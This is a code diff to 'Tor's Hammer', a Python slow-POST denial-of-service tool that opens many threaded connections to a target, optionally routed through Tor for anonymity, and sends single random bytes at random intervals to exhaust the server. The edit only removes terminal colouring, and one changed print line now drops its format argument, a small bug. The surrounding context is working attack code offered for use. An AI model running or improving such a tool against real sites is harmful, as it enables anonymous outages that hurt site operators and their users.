@@ -12,10 +12,8 @@ import terminal
 from threading import Thread
 
 global stop_now
-global term
 
 stop_now = False
-term = terminal.TerminalController()
 
 useragents = [ "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0" ]
 
@@ -45,7 +43,7 @@ class httpPost(Thread):
                 self.running = False
                 break
             p = random.choice(string.letters+string.digits)
-            print (term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL)
+            print ("Posting: %s")
             self.socks.send(p)
             time.sleep(random.uniform(0.1, 3))
 	
@@ -58,12 +56,12 @@ class httpPost(Thread):
                     if self.tor:
                         self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                     self.socks.connect((self.host, self.port))
-                    print (term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL)
+                    print ("Connected to host...")
                     break
                 except Exception as e:
                     if e.args[0] == 106 or e.args[0] == 60:
                         break
-                    print (term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL)
+                    print ("Error connecting to host...")
                     time.sleep(1)
                     continue
 	
@@ -72,7 +70,7 @@ class httpPost(Thread):
                     self._send_http_post()
                 except Exception as e:
                     if e.args[0] == 32 or e.args[0] == 104:
-                        print (term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL)
+                        print ("Thread broken, restarting...")
                         self.socks = socks.socksocket()
                         break
                     time.sleep(0.1)
@@ -119,11 +117,11 @@ def main(argv):
         usage()
         sys.exit(-1)
 
-    print (term.DOWN + term.RED + "/*" + term.NORMAL)
-    print (term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL)
-    print (term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL)
-    print (term.RED + " * Give 20 seconds without tor or 40 with before checking site" + term.NORMAL)
-    print (term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL)
+    print ("/*")
+    print (" * Target: %s Port: %d" % (target, port))
+    print (" * Threads: %d Tor: %s" % (threads, tor))
+    print (" * Give 20 seconds without tor or 40 with before checking site")
+    print (" */")
 
     rthreads = []
     for i in range(threads):
@@ -142,7 +140,7 @@ def main(argv):
 
 if __name__ == "__main__":
     print ("\n/*")
-    print (" *"+term.RED + " Tor's Hammer "+term.NORMAL)
+    print (" * Tor's Hammer ")
     print (" * Slow POST DoS Testing Tool")
     print (" * lidarbtc@protonmail.com")
     print (" * Anon-ymized via Tor")
